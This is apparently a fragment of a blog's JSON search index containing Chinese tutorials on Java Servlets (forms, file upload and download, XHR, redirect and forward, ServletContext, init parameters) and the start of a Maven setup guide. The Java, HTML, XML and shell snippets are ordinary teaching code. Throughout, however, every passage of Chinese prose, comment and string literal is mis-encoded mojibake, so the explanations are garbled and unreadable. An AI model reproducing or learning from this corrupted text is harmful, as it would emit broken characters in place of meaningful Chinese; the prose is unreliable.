}\n}\n```\n\n`ParameterMap`å­˜å‚¨äº†æˆ‘ä»¬å‘é€çš„POSTè¯·æ±‚æ‰€æºå¸¦çš„è¡¨å•æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†å…¶éå†æŸ¥çœ‹ï¼Œæµè§ˆå™¨å‘é€äº†ä»€ä¹ˆæ•°æ®ã€‚\n\nç°åœ¨æˆ‘ä»¬å†æ¥ä¿®æ”¹ä¸€ä¸‹å‰ç«¯ï¼š\n\n```html\n<body>\n    <h1>ç™»å½•åˆ°ç³»ç»Ÿ</h1>\n    <form method=\"post\" action=\"login\">\n        <hr>\n        <div>\n            <label>\n                <input type=\"text\" placeholder=\"ç”¨æˆ·å\" name=\"username\">\n            </label>\n        </div>\n        <div>\n            <label>\n                <input type=\"password\" placeholder=\"å¯†ç \" name=\"password\">\n            </label>\n        </div>\n        <div>\n            <button>ç™»å½•</button>\n        </div>\n    </form>\n</body>\n```\n\nç°åœ¨æˆ‘ä»¬ç‚¹å‡»ç™»å½•æŒ‰é’®ï¼Œä¼šè‡ªåŠ¨å‘åå°å‘é€ä¸€ä¸ªPOSTè¯·æ±‚ï¼Œè¯·æ±‚åœ°å€ä¸ºå½“å‰åœ°å€+/loginï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸Šé¢ç¼–å†™çš„Servletè·¯å¾„ã€‚\n\n## ä¸Šä¼ å’Œä¸‹è½½æ–‡ä»¶\n\né¦–å…ˆå°†icon.pngæ”¾å…¥åˆ°resourceæ–‡ä»¶å¤¹ä¸­ï¼Œæ¥ç€æˆ‘ä»¬ç¼–å†™ä¸€ä¸ªServletç”¨äºå¤„ç†æ–‡ä»¶ä¸‹è½½ï¼š\n\n```java\n@WebServlet(\"/file\")\npublic class FileServlet extends HttpServlet {\n\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n      resp.setContentType(\"image/png\");  \n      OutputStream outputStream = resp.getOutputStream();\n      InputStream inputStream = Resources.getResourceAsStream(\"icon.png\");\n\n    }\n}\n```\n\nä¸ºäº†æ›´åŠ å¿«é€Ÿåœ°ç¼–å†™IOä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥å¼•å…¥ä¸€ä¸ªå·¥å…·åº“ï¼š\n\n```xml\n<dependency>\n    <groupId>commons-io</groupId>\n    <artifactId>commons-io</artifactId>\n    <version>2.6</version>\n</dependency>\n```\n\nä½¿ç”¨æ­¤ç±»åº“å¯ä»¥å¿«é€Ÿå®ŒæˆIOæ“ä½œï¼š\n\n```java\nresp.setContentType(\"image/png\");\nOutputStream outputStream = resp.getOutputStream();\nInputStream inputStream = Resources.getResourceAsStream(\"icon.png\");\n//ç›´æ¥ä½¿ç”¨copyæ–¹æ³•å®Œæˆè½¬æ¢\nIOUtils.copy(inputStream, outputStream);\n```\n\nç°åœ¨æˆ‘ä»¬åœ¨å‰ç«¯é¡µé¢æ·»åŠ ä¸€ä¸ªé“¾æ¥ï¼Œç”¨äºä¸‹è½½æ­¤æ–‡ä»¶ï¼š\n\n```html\n<hr>\n<a href=\"file\" download=\"icon.png\">ç‚¹æˆ‘ä¸‹è½½é«˜æ¸…èµ„æº</a>\n```\n\nä¸‹è½½æ–‡ä»¶æå®šï¼Œé‚£ä¹ˆå¦‚ä½•ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶å‘¢ï¼Ÿ\n\né¦–å…ˆæˆ‘ä»¬ç¼–å†™å‰ç«¯éƒ¨åˆ†ï¼š\n\n```html\n<form method=\"post\" action=\"file\" enctype=\"multipart/form-data\">\n    <div>\n        <input type=\"file\" name=\"test-file\">\n    </div>\n    <div>\n        <button>ä¸Šä¼ æ–‡ä»¶</button>\n    </div>\n</form>\n```\n\næ³¨æ„å¿…é¡»æ·»åŠ `enctype=\"multipart/form-data\"`ï¼Œæ¥è¡¨ç¤ºæ­¤è¡¨å•ç”¨äºæ–‡ä»¶ä¼ è¾“ã€‚\n\nç°åœ¨æ¥ä¿®æ”¹ä¸€ä¸‹Servletä»£ç ï¼š\n\n```java\n@MultipartConfig\n@WebServlet(\"/file\")\npublic class FileServlet extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        try(FileOutputStream stream = new FileOutputStream(\"/Users/nagocoler/Documents/IdeaProjects/WebTest/test.png\")){\n            Part part = req.getPart(\"test-file\");\n            IOUtils.copy(part.getInputStream(), stream);\n            resp.setContentType(\"text/html;charset=UTF-8\");\n            resp.getWriter().write(\"æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼\");\n        }\n    }\n}\n```\n\næ³¨æ„ï¼Œå¿…é¡»æ·»åŠ `@MultipartConfig`æ³¨è§£æ¥è¡¨ç¤ºæ­¤Servletç”¨äºå¤„ç†æ–‡ä»¶ä¸Šä¼ è¯·æ±‚ã€‚\n\nç°åœ¨å†è¿è¡ŒæœåŠ¡å™¨ï¼Œå¹¶å°†æˆ‘ä»¬åˆšæ‰ä¸‹è½½çš„æ–‡ä»¶åˆä¸Šä¼ ç»™æœåŠ¡ç«¯ã€‚\n\n## ä½¿ç”¨XHRè¯·æ±‚æ•°æ®\n\nç°åœ¨æˆ‘ä»¬å¸Œæœ›ï¼Œç½‘é¡µä¸­çš„éƒ¨åˆ†å†…å®¹ï¼Œå¯ä»¥åŠ¨æ€æ˜¾ç¤ºï¼Œæ¯”å¦‚ç½‘é¡µä¸Šæœ‰ä¸€ä¸ªæ—¶é—´ï¼Œæ—è¾¹æœ‰ä¸€ä¸ªæŒ‰é’®ï¼Œç‚¹å‡»æŒ‰é’®å°±å¯ä»¥åˆ·æ–°å½“å‰æ—¶é—´ã€‚\n\nè¿™ä¸ªæ—¶å€™å°±éœ€è¦æˆ‘ä»¬åœ¨ç½‘é¡µå±•ç¤ºæ—¶å‘åç«¯å‘èµ·è¯·æ±‚äº†ï¼Œå¹¶æ ¹æ®åç«¯å“åº”çš„ç»“æœï¼ŒåŠ¨æ€åœ°æ›´æ–°é¡µé¢ä¸­çš„å†…å®¹ï¼Œè¦å®ç°æ­¤åŠŸèƒ½ï¼Œå°±éœ€è¦ç”¨åˆ°JavaScriptæ¥å¸®åŠ©æˆ‘ä»¬ï¼Œé¦–å…ˆåœ¨jsä¸­ç¼–å†™æˆ‘ä»¬çš„XHRè¯·æ±‚ï¼Œå¹¶åœ¨è¯·æ±‚ä¸­å®ŒæˆåŠ¨æ€æ›´æ–°ï¼š\n\n```js\nfunction updateTime() {\n    let xhr = new XMLHttpRequest();\n    xhr.onreadystatechange = function() {\n        if (xhr.readyState === 4 && xhr.status === 200) {\n            document.getElementById(\"time\").innerText = xhr.responseText\n        }\n    };\n    xhr.open('GET', 'time', true);\n    xhr.send();\n}\n```\n\næ¥ç€ä¿®æ”¹ä¸€ä¸‹å‰ç«¯é¡µé¢ï¼Œæ·»åŠ ä¸€ä¸ªæ—¶é—´æ˜¾ç¤ºåŒºåŸŸï¼š\n\n```html\n<hr>\n<div id=\"time\"></div>\n<br>\n<button onclick=\"updateTime()\">æ›´æ–°æ•°æ®</button>\n<script>\n    updateTime()\n</script>\n```\n\næœ€ååˆ›å»ºä¸€ä¸ªServletç”¨äºå¤„ç†æ—¶é—´æ›´æ–°è¯·æ±‚ï¼š\n\n```java\n@WebServlet(\"/time\")\npublic class TimeServlet extends HttpServlet {\n\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        SimpleDateFormat dateFormat = new SimpleDateFormat(\"yyyyå¹´MMæœˆddæ—¥ HH:mm:ss\");\n        String date = dateFormat.format(new Date());\n        resp.setContentType(\"text/html;charset=UTF-8\");\n        resp.getWriter().write(date);\n    }\n}\n```\n\nç°åœ¨ç‚¹å‡»æŒ‰é’®å°±å¯ä»¥æ›´æ–°äº†ã€‚\n\nGETè¯·æ±‚ä¹Ÿèƒ½ä¼ é€’å‚æ•°ï¼Œè¿™é‡Œåšä¸€ä¸‹æ¼”ç¤ºã€‚\n\n## é‡å®šå‘ä¸è¯·æ±‚è½¬å‘\n\nå½“æˆ‘ä»¬å¸Œæœ›ç”¨æˆ·ç™»å½•å®Œæˆä¹‹åï¼Œç›´æ¥è·³è½¬åˆ°ç½‘ç«™çš„é¦–é¡µï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨é‡å®šå‘æ¥å®Œæˆã€‚å½“æµè§ˆå™¨æ”¶åˆ°ä¸€ä¸ªé‡å®šå‘çš„å“åº”æ—¶ï¼Œä¼šæŒ‰ç…§é‡å®šå‘å“åº”ç»™å‡ºçš„åœ°å€ï¼Œå†æ¬¡å‘æ­¤åœ°å€å‘å‡ºè¯·æ±‚ã€‚\n\nå®ç°é‡å®šå‘å¾ˆç®€å•ï¼Œåªéœ€è¦è°ƒç”¨ä¸€ä¸ªæ–¹æ³•å³å¯ï¼Œæˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹ç™»é™†æˆåŠŸåæ‰§è¡Œçš„ä»£ç ï¼š\n\n```java\nresp.sendRedirect(\"time\");\n```\n\nè°ƒç”¨åï¼Œå“åº”çš„çŠ¶æ€ç ä¼šè¢«è®¾ç½®ä¸º302ï¼Œå¹¶ä¸”å“åº”å¤´ä¸­æ·»åŠ äº†ä¸€ä¸ªLocationå±æ€§ï¼Œæ­¤å±æ€§è¡¨ç¤ºï¼Œéœ€è¦é‡å®šå‘åˆ°å“ªä¸€ä¸ªç½‘å€ã€‚\n\næ¥ç€æ¥çœ‹è¯·æ±‚è½¬å‘ï¼Œè¯·æ±‚è½¬å‘å…¶å®æ˜¯ä¸€ç§æœåŠ¡å™¨å†…éƒ¨çš„è·³è½¬æœºåˆ¶ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œé‡å®šå‘ä¼šä½¿å¾—æµè§ˆå™¨å»é‡æ–°è¯·æ±‚ä¸€ä¸ªé¡µé¢ï¼Œè€Œè¯·æ±‚è½¬å‘åˆ™æ˜¯æœåŠ¡å™¨å†…éƒ¨è¿›è¡Œè·³è½¬ï¼Œå®ƒçš„ç›®çš„æ˜¯ï¼Œç›´æ¥å°†æœ¬æ¬¡è¯·æ±‚è½¬å‘ç»™å…¶ä»–Servletè¿›è¡Œå¤„ç†ï¼Œå¹¶ç”±å…¶ä»–Servletæ¥è¿”å›ç»“æœï¼Œå› æ­¤å®ƒæ˜¯åœ¨è¿›è¡Œå†…éƒ¨çš„è½¬å‘ã€‚\n\n```java\nreq.getRequestDispatcher(\"/time\").forward(req, resp);\n```\n\nç°åœ¨ï¼Œåœ¨ç™»é™†æˆåŠŸçš„æ—¶å€™ï¼Œæˆ‘ä»¬å°†è¯·æ±‚è½¬å‘ç»™å¤„ç†æ—¶é—´çš„Servletï¼Œæ³¨æ„è¿™é‡Œçš„è·¯å¾„è§„åˆ™å’Œä¹‹å‰çš„ä¸åŒï¼Œæˆ‘ä»¬éœ€è¦å¡«å†™Servletä¸ŠæŒ‡æ˜çš„è·¯å¾„ï¼Œå¹¶ä¸”è¯·æ±‚è½¬å‘åªèƒ½è½¬å‘åˆ°æ­¤åº”ç”¨ç¨‹åºå†…éƒ¨çš„Servletï¼Œä¸èƒ½è½¬å‘ç»™å…¶ä»–ç«™ç‚¹æˆ–æ˜¯å…¶ä»–Webåº”ç”¨ç¨‹åºã€‚\n\nç°åœ¨å†æ¬¡è¿›è¡Œç™»é™†æ“ä½œï¼Œæˆ‘ä»¬å‘ç°ï¼Œè¿”å›ç»“æœä¸ºä¸€ä¸ª405é¡µé¢ï¼Œè¯æ˜äº†ï¼Œæˆ‘ä»¬çš„è¯·æ±‚ç°åœ¨æ˜¯è¢«å¦ä¸€ä¸ªServletè¿›è¡Œå¤„ç†ï¼Œå¹¶ä¸”è¯·æ±‚çš„ä¿¡æ¯å…¨éƒ¨è¢«è½¬äº¤ç»™å¦ä¸€ä¸ªServletï¼Œç”±äºæ­¤Servletä¸æ”¯æŒPOSTè¯·æ±‚ï¼Œå› æ­¤è¿”å›405çŠ¶æ€ç ã€‚\n\né‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ï¼Œè¯¥è¯·æ±‚åŒ…æ‹¬è¯·æ±‚å‚æ•°ä¹Ÿä¸€èµ·è¢«ä¼ é€’äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•è·å–ä»¥ä¸‹POSTè¯·æ±‚çš„å‚æ•°ã€‚\n\nç°åœ¨æˆ‘ä»¬ç»™æ­¤Servletæ·»åŠ POSTè¯·æ±‚å¤„ç†ï¼Œç›´æ¥è½¬äº¤ç»™Getè¯·æ±‚å¤„ç†ï¼š\n\n```java\n@Override\nprotected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n    this.doGet(req, resp);\n}\n```\n\nå†æ¬¡è®¿é—®ï¼ŒæˆåŠŸå¾—åˆ°ç»“æœï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°ï¼Œæµè§ˆå™¨åªå‘èµ·äº†ä¸€æ¬¡è¯·æ±‚ï¼Œå¹¶æ²¡æœ‰å†æ¬¡è¯·æ±‚æ–°çš„URLï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸€æ¬¡è¯·æ±‚ç›´æ¥è¿”å›äº†è¯·æ±‚è½¬å‘åçš„å¤„ç†ç»“æœã€‚\n\né‚£ä¹ˆï¼Œè¯·æ±‚è½¬å‘æœ‰ä»€ä¹ˆå¥½å¤„å‘¢ï¼Ÿå®ƒå¯ä»¥æºå¸¦æ•°æ®ï¼\n\n```java\nreq.setAttribute(\"test\", \"æˆ‘æ˜¯è¯·æ±‚è½¬å‘å‰çš„æ•°æ®\");\nreq.getRequestDispatcher(\"/time\").forward(req, resp);\n```\n\n```java\nSystem.out.println(req.getAttribute(\"test\"));\n```\n\né€šè¿‡`setAttribute`æ–¹æ³•æ¥ç»™å½“å‰è¯·æ±‚æ·»åŠ ä¸€ä¸ªé™„åŠ æ•°æ®ï¼Œåœ¨è¯·æ±‚è½¬å‘åï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è·å–åˆ°è¯¥æ•°æ®ã€‚\n\né‡å®šå‘å±äº2æ¬¡è¯·æ±‚ï¼Œå› æ­¤æ— æ³•ä½¿ç”¨è¿™ç§æ–¹å¼æ¥ä¼ é€’æ•°æ®ï¼Œé‚£ä¹ˆï¼Œå¦‚ä½•åœ¨é‡å®šå‘ä¹‹é—´ä¼ é€’æ•°æ®å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å³å°†è¦ä»‹ç»çš„ServletContextå¯¹è±¡ã€‚\n\næœ€åæ€»ç»“ï¼Œä¸¤è€…çš„åŒºåˆ«ä¸ºï¼š\n\n* è¯·æ±‚è½¬å‘æ˜¯ä¸€æ¬¡è¯·æ±‚ï¼Œé‡å®šå‘æ˜¯ä¸¤æ¬¡è¯·æ±‚\n* è¯·æ±‚è½¬å‘åœ°å€æ ä¸ä¼šå‘ç”Ÿæ”¹å˜ï¼Œ é‡å®šå‘åœ°å€æ ä¼šå‘ç”Ÿæ”¹å˜\n* è¯·æ±‚è½¬å‘å¯ä»¥å…±äº«è¯·æ±‚å‚æ•° ï¼Œé‡å®šå‘ä¹‹åï¼Œå°±è·å–ä¸äº†å…±äº«å‚æ•°äº†\n* è¯·æ±‚è½¬å‘åªèƒ½è½¬å‘ç»™å†…éƒ¨çš„Servlet\n\n## ServletContextå¯¹è±¡\n\nServletContextå…¨å±€å”¯ä¸€ï¼Œå®ƒæ˜¯å±äºæ•´ä¸ªWebåº”ç”¨ç¨‹åºçš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡`getServletContext()`æ¥è·å–åˆ°æ­¤å¯¹è±¡ã€‚\n\næ­¤å¯¹è±¡ä¹Ÿèƒ½è®¾ç½®é™„åŠ å€¼ï¼š\n\n```java\nServletContext context = getServletContext();\ncontext.setAttribute(\"test\", \"æˆ‘æ˜¯é‡å®šå‘ä¹‹å‰çš„æ•°æ®\");\nresp.sendRedirect(\"time\");\n```\n\n```java\nSystem.out.println(getServletContext().getAttribute(\"test\"));\n```\n\nå› ä¸ºæ— è®ºåœ¨å“ªé‡Œï¼Œæ— è®ºä»€ä¹ˆæ—¶é—´ï¼Œè·å–åˆ°çš„ServletContextå§‹ç»ˆæ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥éšæ—¶éšåœ°è·å–æˆ‘ä»¬æ·»åŠ çš„å±æ€§ã€‚\n\nå®ƒä¸ä»…ä»…å¯ä»¥ç”¨æ¥è¿›è¡Œæ•°æ®ä¼ é€’ï¼Œè¿˜å¯ä»¥åšä¸€äº›å…¶ä»–çš„äº‹æƒ…ï¼Œæ¯”å¦‚è¯·æ±‚è½¬å‘ï¼š\n\n```java\ncontext.getRequestDispatcher(\"/time\").forward(req, resp);\n```\n\nå®ƒè¿˜å¯ä»¥è·å–æ ¹ç›®å½•ä¸‹çš„èµ„æºæ–‡ä»¶ï¼ˆæ³¨æ„æ˜¯webappæ ¹ç›®å½•ä¸‹çš„ï¼Œä¸æ˜¯resourceä¸­çš„èµ„æºï¼‰\n\n## åˆå§‹åŒ–å‚æ•°\n\nåˆå§‹åŒ–å‚æ•°ç±»ä¼¼äºåˆå§‹åŒ–é…ç½®éœ€è¦çš„ä¸€äº›å€¼ï¼Œæ¯”å¦‚æˆ‘ä»¬çš„æ•°æ®åº“è¿æ¥ç›¸å…³ä¿¡æ¯ï¼Œå°±å¯ä»¥é€šè¿‡åˆå§‹åŒ–å‚æ•°æ¥ç»™äºˆServletï¼Œæˆ–æ˜¯ä¸€äº›å…¶ä»–çš„é…ç½®é¡¹ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨åˆå§‹åŒ–å‚æ•°æ¥å®ç°ã€‚\n\næˆ‘ä»¬å¯ä»¥ç»™ä¸€ä¸ªServletæ·»åŠ ä¸€äº›åˆå§‹åŒ–å‚æ•°ï¼š\n\n```java\n@WebServlet(value = \"/login\", initParams = {\n        @WebInitParam(name = \"test\", value = \"æˆ‘æ˜¯ä¸€ä¸ªé»˜è®¤çš„åˆå§‹åŒ–å‚æ•°\")\n})\n```\n\nå®ƒä¹Ÿæ˜¯ä»¥é”®å€¼å¯¹å½¢å¼ä¿å­˜çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡Servletçš„`getInitParameter`æ–¹æ³•è·å–ï¼š\n\n```java\nSystem.out.println(getInitParameter(\"test\"));\n```\n\nä½†æ˜¯ï¼Œè¿™é‡Œçš„åˆå§‹åŒ–å‚æ•°ä»…ä»…æ˜¯é’ˆå¯¹äºæ­¤Servletï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å®šä¹‰å…¨å±€åˆå§‹åŒ–å‚æ•°ï¼Œåªéœ€è¦åœ¨web.xmlç¼–å†™å³å¯ï¼š\n\n```xml\n<context-param>\n    <param-name>lbwnb</param-name>\n    <param-value>æˆ‘æ˜¯å…¨å±€åˆå§‹åŒ–å‚æ•°</param-value>\n</context-param>\n```\n\næˆ‘ä»¬éœ€è¦ä½¿ç”¨ServletContextæ¥è¯»å–å…¨å±€åˆå§‹åŒ–å‚æ•°ï¼š\n\n```java\nServletContext context = getServletContext();\nSystem.out.println(context.getInitParameter(\"lbwnb\"));\n```\n\n\n\n## å‚è€ƒ\n\n- [é‡æ¸©Servletï¼Œ2020å¹´äº†ï¼Œå®ƒè¿˜æœ‰å¿…è¦å­¦å—ï¼Ÿ](https://www.cnblogs.com/tanghaorong/p/12713000.html)\n- [Servletæ•™ç¨‹ (biancheng.net)](http://c.biancheng.net/servlet2/)\n\n## Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Servlet"],"categories":["JavaWeb"]},{"title":"Maven","url":"/posts/38008.html","content":"\n## Maven ç®€ä»‹\n\n> Maven æ˜¯ Apache ä¸‹çš„ä¸€ä¸ªçº¯ Java å¼€å‘çš„é¡¹ç›®ç®¡ç†å’Œæ•´åˆå·¥å…·ã€‚å®ƒå°†é¡¹ç›®çš„å¼€å‘å’Œç®¡ç†è¿‡ç¨‹æŠ½è±¡æˆä¸€ä¸ªé¡¹ç›®å¯¹è±¡æ¨¡å‹ï¼ˆPOMï¼‰ã€‚å¼€å‘äººå‘˜åªéœ€è¦åšä¸€äº›ç®€å•çš„é…ç½®ï¼ŒMaven å°±å¯ä»¥è‡ªåŠ¨å®Œæˆé¡¹ç›®çš„ç¼–è¯‘ã€æµ‹è¯•ã€æ‰“åŒ…ã€å‘å¸ƒä»¥åŠéƒ¨ç½²ç­‰å·¥ä½œã€‚\n\né€šè¿‡Mavenï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬åšï¼š\n\n* é¡¹ç›®çš„è‡ªåŠ¨æ„å»ºï¼ŒåŒ…æ‹¬ä»£ç çš„ç¼–è¯‘ã€æµ‹è¯•ã€æ‰“åŒ…ã€å®‰è£…ã€éƒ¨ç½²ç­‰æ“ä½œã€‚\n* ä¾èµ–ç®¡ç†ï¼Œé¡¹ç›®ä½¿ç”¨åˆ°å“ªäº›ä¾èµ–ï¼Œå¯ä»¥å¿«é€Ÿå®Œæˆå¯¼å…¥ã€‚\n\nä¹‹å‰æˆ‘ä»¬å¯¼å…¥ä¾èµ–çš„æ—¶å€™ï¼Œæ¯æ¬¡éƒ½è¦å»ä¸‹è½½å¯¹åº”çš„ Jar åŒ…ï¼Œè¿™æ ·å…¶å®æ˜¯å¾ˆéº»çƒ¦çš„ï¼Œå¹¶ä¸”è¿˜æœ‰å¯èƒ½ä¸€ä¸ª Jar åŒ…ä¾èµ–äºå¦ä¸€ä¸ª Jar åŒ…ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ›´åŠ æ–¹ä¾¿çš„åŒ…ç®¡ç†æœºåˆ¶ã€‚\n\n## Mavenå®‰è£…\n\n### ä¸‹è½½ Maven\n\n- å®‰è£…å‰è¯·ç¡®è®¤ JDK å·²å®‰è£…å®Œæ¯•\n\n- å®˜ç½‘ä¸‹è½½åœ°å€ï¼š[Maven â€“ Download Apache Maven](https://maven.apache.org/download.cgi)\n\n- ä¸‹è½½ apache-maven-3.8.5-bin.zipï¼Œè§£å‹åç§»åŠ¨åˆ° `/opt`ç›®å½•ä¸‹\n\n###  **é…ç½®ç¯å¢ƒå˜é‡**\n\né…ç½® .bash\\_profile ç¯å¢ƒå˜é‡ï¼Œä½†æ˜¯å¦‚æœä½ å®‰è£…äº† iterm+zsh å°±éœ€è¦åœ¨ .zshrc ç¯å¢ƒå˜é‡æ–‡ä»¶ä¸­é…ç½®\n\n```bash\n$ vim ~/.zshrc\n\n#æ³¨æ„å°†è·¯å¾„ä¿®æ”¹ä¸ºä½ çš„mavenæ–‡ä»¶è·¯å¾„\nexport MAVEN_HOME=/opt/maven/apache-maven-3.8.4 \nexport PATH=$PATH:$MAVEN_HOME/bin\n\n$ source ~/.zshrc #æ›´æ–°ç¯å¢ƒå˜é‡\n\n$ mvn -v  #æµ‹è¯•maven\n```\n\n### Mavenç›®å½•ç»“æ„\n\n```bash\n$ tree -L 1\n.\nâ”œâ”€â”€ LICENSE\nâ”œâ”€â”€ NOTICE\nâ”œâ”€â”€ README.txt\nâ”œâ”€â”€ bin\nâ”œâ”€â”€ boot\nâ”œâ”€â”€ conf\nâ””â”€â”€ lib\n```\n\n- binï¼šè¯¥ç›®å½•åŒ…å«äº† mvn è¿è¡Œçš„è„šæœ¬\n\n- bootï¼šè¯¥ç›®å½•åªåŒ…å«ä¸€ä¸ªæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶ä¸ºplexus-classworlds-2.6.0.jar\n  - plexus-classworlds æ˜¯ä¸€ä¸ªç±»åŠ è½½å™¨æ¡†æ¶ï¼Œç›¸å¯¹äºé»˜è®¤çš„ java ç±»åŠ è½½å™¨ï¼Œå®ƒæä¾›äº†æ›´åŠ ä¸°å¯Œçš„è¯­æ³•ä»¥æ–¹ä¾¿é…ç½®ï¼ŒMaven ä½¿ç”¨è¯¥æ¡†æ¶åŠ è½½è‡ªå·±çš„ç±»åº“ã€‚\n\n- confï¼šè¯¥ç›®å½•åŒ…å«äº†ä¸€ä¸ªéå¸¸é‡è¦çš„æ–‡ä»¶ settings.xml\n  - ç›´æ¥ä¿®æ”¹è¯¥æ–‡ä»¶ï¼Œå°±èƒ½åœ¨æœºå™¨ä¸Šå…¨å±€åœ°å®šåˆ¶ Mavençš„è¡Œä¸ºï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å¤åˆ¶è¯¥æ–‡ä»¶è‡³`~/.m2/`ç›®å½•ä¸‹ï¼Œç„¶åä¿®æ”¹è¯¥æ–‡ä»¶ï¼Œåœ¨ç”¨æˆ·èŒƒå›´å®šåˆ¶Mavençš„è¡Œä¸º\n\n- libï¼šè¯¥ç›®å½•åŒ…å«äº†æ‰€æœ‰ Maven è¿è¡Œæ—¶éœ€è¦çš„Javaç±»åº“å’Œ Maven ç”¨åˆ°çš„ç¬¬ä¸‰æ–¹ä¾èµ–\n\n### æ›´æ¢é˜¿é‡Œé•œåƒ\n\n#### å…¨å±€é…ç½®\n\næ‰“å¼€`apache-maven-3.8.4/conf/setting.xml` æ–‡ä»¶ï¼Œå¤§æ¦‚åœ¨150è¡Œå·¦å³ï¼Œæ‰¾åˆ°`mirrors`ï¼Œæ·»åŠ å¦‚ä¸‹ä»£ç ï¼š\n\n```xml\n<mirror>\n    <id>nexus-aliyun</id>\n    <mirrorOf>central</mirrorOf>\n    <name>Nexus aliyun</name>\n    <url>http://maven.aliyun.com/nexus/content/groups/public</url>\n</mirror>\n```\n\næ³¨ï¼šIDEAè‡ªå¸¦çš„Mavençš„é…ç½®æ–‡ä»¶åœ¨`/User/.m2/settings.xml` ä½ç½®ä¸‹\n\nä½¿ç”¨IDEAåˆ›å»ºæ—¶ï¼Œåœ¨åå¥½è®¾ç½®ä¸‹çš„æ„å»ºå·¥å…·ä¸­è¿›è¡Œä¿®æ”¹Mavené…ç½®\n\n```\nMavenä¸»è·¯å¾„ï¼š/opt/maven/apache-maven-3.8.4\nç”¨æˆ·è®¾ç½®æ–‡ä»¶ï¼š/opt/maven/apache-maven-3.8.4/conf/settings.xml\næœ¬åœ°ä»“åº“ï¼š/opt/maven/repository\n```\n\n#### å•é¡¹ç›®é…ç½®\n\nå•é¡¹ç›®é…ç½®æ—¶ï¼Œéœ€è¦ä¿®æ”¹pomæ–‡ä»¶ã€‚åœ¨pomæ–‡ä»¶ä¸­ï¼Œé€šè¿‡è¦†ç›–é»˜è®¤çš„ä¸­å¤®ä»“åº“çš„é…ç½®ï¼Œå®ç°ä¸­å¤®ä»“åº“åœ°å€çš„å˜æ›´ã€‚\nä¿®æ”¹é¡¹ç›®çš„pomæ–‡ä»¶ï¼š\n\n```xml\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n    <groupId>com.test</groupId>\n    <artifactId>conifg</artifactId>\n    <packaging>war</packaging>\n    <version>0.0.1-SNAPSHOT</version>\n\n    <repositories>\n        <repository>\n            <id>central</id>\n            <name>aliyun maven</name>\n            <url>http://maven.aliyun.com/nexus/content/groups/public/</url>\n            <layout>default</layout>\n            <!-- æ˜¯å¦å¼€å¯å‘å¸ƒç‰ˆæ„ä»¶ä¸‹è½½ -->\n            <releases>\n                <enabled>true</enabled>\n            </releases>\n            <!-- æ˜¯å¦å¼€å¯å¿«ç…§ç‰ˆæ„ä»¶ä¸‹è½½ -->\n            <snapshots>\n                <enabled>false</enabled>\n            </snapshots>\n        </repository>\n    </repositories>\n\n</project>\n```\n\n## Mavené¡¹ç›®ç»“æ„\n\næˆ‘ä»¬å¯ä»¥æ¥çœ‹ä¸€ä¸‹ï¼Œä¸€ä¸ª Maven é¡¹ç›®å’Œæˆ‘ä»¬æ™®é€šçš„é¡¹ç›®æœ‰ä»€ä¹ˆåŒºåˆ«ï¼š\n\n![](https://img.jwt1399.top/img/src=http%253A%252F%252Fimg-blog.csdnimg.cn%252Fimg_convert%252F910235ebc812ba94abb0f762e3914f67.png&refer=http%253A%252F%252Fimg-blog.csdnimg.jpeg)\n\n```bash\n$ tree -L 3\n.\nâ”œâ”€â”€ pom.xml 